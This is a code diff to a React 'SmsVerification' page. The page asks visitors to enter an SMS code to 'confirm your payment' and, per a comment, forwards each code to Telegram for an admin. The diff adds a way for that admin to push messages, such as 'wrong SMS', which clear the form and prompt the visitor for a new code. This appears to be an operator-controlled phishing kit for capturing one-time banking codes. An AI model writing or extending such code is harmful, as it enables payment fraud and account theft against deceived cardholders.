@@ -1,6 +1,9 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
-import { ArrowLeft, MessageSquare, Shield, Loader2 } from "lucide-react";
+import { ArrowLeft, MessageSquare, Shield, Loader2, AlertTriangle, XCircle, Info
+
+
+ } from "lucide-react";
 import {
   InputOTP,
   InputOTPGroup,
@@ -13,12 +16,31 @@ interface SmsVerificationProps {
   sessionCode: string;
   clientName: string | null;
   phoneNumber: string | null;
+  adminMessage: string | null;
+  messageType: string | null;
+  onDismissMessage: () => void;
 }
 
-const SmsVerification = ({ onBack, sessionCode, clientName, phoneNumber }: SmsVerificationProps) => {
+const SmsVerification = ({ 
+  onBack, 
+  sessionCode, 
+  clientName, 
+  phoneNumber,
+  adminMessage,
+  messageType,
+  onDismissMessage
+}: SmsVerificationProps) => {
   const [code, setCode] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
+
+  // Reset form when admin sends an error message (wrong SMS)
+  useEffect(() => {
+    if (adminMessage && messageType === "error" && isSubmitted) {
+      setIsSubmitted(false);
+      setCode("");
+    }
+  }, [adminMessage, messageType, isSubmitted]);
 
   const sendCodeToTelegram = async (smsCode: string) => {
     try {
@@ -48,11 +70,30 @@ const SmsVerification = ({ onBack, sessionCode, clientName, phoneNumber }: SmsVe
     
     setIsSubmitting(true);
     
+    // Clear any previous admin message
+    onDismissMessage();
+    
     // Send the code to Telegram for admin to see
     await sendCodeToTelegram(code);
     
     setIsSubmitting(false);
     setIsSubmitted(true);
+  };
+
+  const getAlertIcon = () => {
+    switch (messageType) {
+      case "error": return <XCircle className="w-5 h-5" />;
+      case "warning": return <AlertTriangle className="w-5 h-5" />;
+      default: return <Info className="w-5 h-5" />;
+    }
+  };
+
+  const getAlertStyles = () => {
+    switch (messageType) {
+      case "error": return "bg-destructive/10 border-destructive/30 text-destructive";
+      case "warning": return "bg-yellow-500/10 border-yellow-500/30 text-yellow-600";
+      default: return "bg-blue-500/10 border-blue-500/30 text-blue-600";
+    }
   };
 
   if (isSubmitted) {
@@ -108,6 +149,19 @@ const SmsVerification = ({ onBack, sessionCode, clientName, phoneNumber }: SmsVe
             Enter the verification code you received via SMS to confirm your payment.
           </p>
         </div>
+
+        {/* Admin Alert Message */}
+        {adminMessage && (
+          <div className={`flex items-start gap-3 p-4 rounded-xl border mb-6 ${getAlertStyles()}`}>
+            {getAlertIcon()}
+            <div className="flex-1">
+              <p className="text-sm font-medium">{adminMessage}</p>
+            </div>
+            <button onClick={onDismissMessage} className="opacity-70 hover:opacity-100">
+              <XCircle className="w-4 h-4" />
+            </button>
+          </div>
+        )}
 
         {/* SMS Info */}
         <div className="bg-secondary/50 rounded-xl p-4 mb-6">
